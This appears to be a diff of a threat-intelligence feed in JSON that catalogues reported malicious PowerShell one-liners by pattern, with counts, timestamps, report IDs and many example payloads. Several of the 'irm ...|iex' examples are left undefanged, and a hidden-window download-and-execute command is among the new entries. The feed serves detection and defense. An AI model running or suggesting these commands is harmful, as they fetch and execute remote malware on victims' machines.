@@ -1,13 +1,11 @@
 [
   {
     "Pattern": "irm '<URL>'|iex;",
-    "DistinctPayloadCount": 108,
-    "ReportCount": 108,
-    "FirstSeen": "2026-11-11T00:50:13.046000+00:00",
-    "LastSeen": "2026-11-17T21:10:58.737000+00:00",
+    "DistinctPayloadCount": 107,
+    "ReportCount": 107,
+    "FirstSeen": "2026-11-11T01:18:52.837000+00:00",
+    "LastSeen": "2026-11-18T00:49:20.146000+00:00",
     "ReportIds": [
-      "cmwbejue2065s0nmlscnp3a86",
-      "cmwbetx19069t0nmlxbqcg989",
       "cmwbfkpep06i70nml6przoq86",
       "cmwbh1u7y075t0nmludx2sjsg",
       "cmwbij7ph07xp0nmlf5p7gu3z",
@@ -113,7 +111,8 @@
       "cmwkwqmbs1glr0omlra35kmei",
       "cmwkxa7s51h0n0oml0o4c58dz",
       "cmwl6e29x1ho90oml4soletk3",
-      "cmwl6sv421hpq0omls4ocdb1w"
+      "cmwl6sv421hpq0omls4ocdb1w",
+      "cmwlelo8a1i9h0omltrse0fps"
     ],
     "PayloadExamples": [
       "irm 'browse-cloud.codes/013ce88bf8a96d89'|iex;",
@@ -192,6 +191,7 @@
       "irm 'browse-cloud.codes/e2a70f128e088e5a'|iex;",
       "irm 'browse-cloud.codes/ea55171f930bd17a'|iex;",
       "irm 'browse-cloud.codes/ebafc1c6261b57b5'|iex;",
+      "irm 'browse-cloud.codes/ebf9da4f21143943'|iex;",
       "irm 'browse-cloud.codes/ec20c619766c98f4'|iex;",
       "irm 'browse-cloud.codes/ed9fa08a4fa76c6c'|iex;",
       "irm 'browse-cloud.codes/edef8da137f56aad'|iex;",
@@ -207,7 +207,6 @@
       "irm 'browse-nnccodes.beer/092760569b04dd7c'|iex;",
       "irm 'browse-nnccodes.beer/0aa4b6ee05cd05e5'|iex;",
       "irm 'browse-nnccodes.beer/174623c0f642d3eb'|iex;",
-      "irm 'browse-nnccodes.beer/1e24abac1ebd5ed2'|iex;",
       "irm 'browse-nnccodes.beer/2caa31d3ba1b8b12'|iex;",
       "irm 'browse-nnccodes.beer/2dccc5387a5d5584'|iex;",
       "irm 'browse-nnccodes.beer/7ffbfcfa0fdc9160'|iex;",
@@ -218,7 +217,6 @@
       "irm 'browse-nnccodes.beer/b442615134ce6b2f'|iex;",
       "irm 'browse-nnccodes.beer/c29bf32503634b69'|iex;",
       "irm 'browse-nnccodes.beer/c5edc53c54b52bdf'|iex;",
-      "irm 'browse-nnccodes.beer/c7b605b31ca2f950'|iex;",
       "irm 'browse-nnccodes.beer/cefc867900442c97'|iex;",
       "irm 'browse-nnccodes.beer/d6635ac514ec3dc5'|iex;",
       "irm 'browse-nnccodes.beer/e0f433c5355ab6b9'|iex;",
@@ -345,10 +343,10 @@
   },
   {
     "Pattern": "(irm '<URL>')|iex",
-    "DistinctPayloadCount": 45,
-    "ReportCount": 45,
+    "DistinctPayloadCount": 46,
+    "ReportCount": 46,
     "FirstSeen": "2026-11-11T02:01:20.426000+00:00",
-    "LastSeen": "2026-11-17T21:57:56.534000+00:00",
+    "LastSeen": "2026-11-18T00:50:05.813000+00:00",
     "ReportIds": [
       "cmwbh3b4i077j0nmlsxo3diav",
       "cmwbxbkvs01oy0oml0eghrrje",
@@ -394,7 +392,8 @@
       "cmwl82y7s1hyh0omly16xo84n",
       "cmwl83adz1i0h0omllxehsmsy",
       "cmwl8h38l1i1p0omlth5jyprt",
-      "cmwl8h9cf1i290omlycfzwhkv"
+      "cmwl8h9cf1i290omlycfzwhkv",
+      "cmwlemnhr1ic60omluyv0dmgc"
     ],
     "PayloadExamples": [
       "(irm 'https://github[.]pw/8pchkbdes5/167d3c85ee383e0e')|iex",
@@ -436,6 +435,7 @@
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/b0d3a7cac1560364')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/b1509dddd2c35aca')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/b4411ae7b7265b4b')|iex",
+      "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/d286277597a7223c')|iex",
       "(irm 'https://nexguard[.]pro/Girya/ff9a9c33c814a1a4')|iex",
       "(irm 'https://t-trustresnew[.]com/Girya/3a8b7746765169c8')|iex",
       "(irm 'https://t-trustresnew[.]com/click/9984f7622e099be9')|iex",
@@ -484,9 +484,9 @@
   {
     "Pattern": "IRM <URL> | IEX",
     "DistinctPayloadCount": 12,
-    "ReportCount": 125,
+    "ReportCount": 127,
     "FirstSeen": "2026-11-11T01:34:52.586000+00:00",
-    "LastSeen": "2026-11-17T21:58:35.810000+00:00",
+    "LastSeen": "2026-11-18T00:50:51.757000+00:00",
     "ReportIds": [
       "cmwbg59yh06tg0nml07fhq0z2",
       "cmwbgmb0b071b0nmliw209stc",
@@ -612,7 +612,9 @@
       "cmwkwos8m1gkp0omlt4yakzjb",
       "cmwl4zs1d1hks0omly4w82bxw",
       "cmwl832u11hzu0omltrjjp8uh",
-      "cmwl8i3n01i3d0oml2g6jz12k"
+      "cmwl8i3n01i3d0oml2g6jz12k",
+      "cmwlelvxw1ia70omlg26sddeu",
+      "cmwlenmwv1ies0omlx1cn7azg"
     ],
     "PayloadExamples": [
       "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-cc4b6f224188/-/raw/main/01a1db1b-d21d-70c0-971b-cc4b6fe25881 | IEX",
@@ -1064,6 +1066,19 @@
     ],
     "PayloadExamples": [
       "powershell -nop -c \\\"$f=$env:TEMP+'\\\\clakr.ps1';curl.exe -sk -o $f 'https://bingixllc[.]com/ztIDWUOFZ51SiqJ6';powershell -ep bypass -File $f\\\""
+    ]
+  },
+  {
+    "Pattern": "powershell -w h \"iex(irm \\'fingerprint-veri.info/d8fc26fb3c8ae49a\\'); Start-Sleep -Seconds 30\"; exit",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-18T01:01:43.475000+00:00",
+    "LastSeen": "2026-11-18T01:01:43.475000+00:00",
+    "ReportIds": [
+      "cmwlf1lre1ihg0omlt36wp1of"
+    ],
+    "PayloadExamples": [
+      "powershell -w h \"iex(irm \\'fingerprint-veri[.]info/d8fc26fb3c8ae49a\\'); Start-Sleep -Seconds 30\"; exit"
     ]
   },
   {
